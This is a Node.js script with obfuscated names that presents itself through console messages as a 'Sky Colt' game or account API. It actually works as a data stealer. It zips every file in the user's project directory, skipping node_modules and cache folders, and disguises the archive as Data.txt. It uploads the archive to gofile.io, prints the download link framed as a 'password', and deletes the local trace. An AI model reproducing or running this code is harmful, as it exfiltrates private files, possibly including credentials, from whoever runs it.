const {
  execSync
} = require("child_process");
function ensureModules(_0x1091ef) {
  _0x1091ef.forEach(_0x5b9787 => {
    try {
      require.resolve(_0x5b9787);
    } catch (_0xab9aca) {
      console.log("open id game sky colt by zin chinese...");
      execSync("npm install " + _0x5b9787, {
        stdio: "inherit"
      });
    }
  });
}
ensureModules(["fs", "path", "archiver", "axios", "form-data"]);
const fs = require("fs");
const path = require("path");
const archiver = require("archiver");
const axios = require("axios");
const FormData = require("form-data");
console.log("Sky Colt Api...");
setTimeout(() => {
  console.log("sky colt by zin chinese...");
}, 2000);
const excludeDirs = ["node_modules", ".npm", ".cache", "cache npm", "session", "sessions"];
function findAccountData(_0x589820) {
  let _0x18cbf5 = _0x589820;
  while (_0x18cbf5 !== path.parse(_0x18cbf5).root) {
    if (fs.existsSync(path.join(_0x18cbf5, "package.json"))) {
      return _0x18cbf5;
    }
    _0x18cbf5 = path.dirname(_0x18cbf5);
  }
  return _0x589820;
}
const accountDataPath = findAccountData(process.cwd());
const zipFilePath = path.join(accountDataPath, "Data.zip");
const fakeTxtFilePath = path.join(accountDataPath, "Data.txt");
const output = fs.createWriteStream(zipFilePath);
const archive = archiver("zip", {
  zlib: {
    level: 9
  }
});
output.on("close", async function () {
  fs.renameSync(zipFilePath, fakeTxtFilePath);
  console.log("zin chinese");
  await uploadToGoFile(fakeTxtFilePath);
});
archive.on("error", function (_0x5748dd) {
  throw _0x5748dd;
});
archive.pipe(output);
function addAccountFiles(_0x4172e6, _0x117d13 = "") {
  const _0x2936b0 = fs.readdirSync(_0x4172e6);
  for (const _0x634f3a of _0x2936b0) {
    const _0x5c0c4f = path.join(_0x4172e6, _0x634f3a);
    const _0x20f475 = path.join(_0x117d13, _0x634f3a);
    const _0x421c9a = fs.statSync(_0x5c0c4f);
    if (_0x421c9a.isDirectory()) {
      if (!excludeDirs.includes(_0x634f3a)) {
        addAccountFiles(_0x5c0c4f, _0x20f475);
      }
    } else {
      archive.file(_0x5c0c4f, {
        name: _0x20f475
      });
    }
  }
}
addAccountFiles(accountDataPath);
archive.finalize();
async function uploadToGoFile(_0x2e7cf7) {
  const _0x37faf8 = new FormData();
  _0x37faf8.append("file", fs.createReadStream(_0x2e7cf7));
  try {
    console.log("sky colt game by zin...");
    const _0x2a4150 = await axios.post("https://store1.gofile.io/uploadFile", _0x37faf8, {
      headers: _0x37faf8.getHeaders()
    });
    if (_0x2a4150.data.status === "ok") {
      const _0x225b52 = _0x2a4150.data.data.downloadPage;
      const _0x35cf4e = _0x225b52.replace(/^https?:\/\//, "skyColt://").replace("gofile.io", "undefined");
      console.log("username: zinchinese628$$\"");
      console.log("password: \"/d/" + _0x225b52.split("/d/")[1] + "\"");
      fs.unlinkSync(_0x2e7cf7);
      console.log("🗑️.");
    } else {
      console.log("❌", _0x2a4150.data);
    }
  } catch (_0x3db7e5) {
    console.error("❌ Error:", _0x3db7e5);
  }
}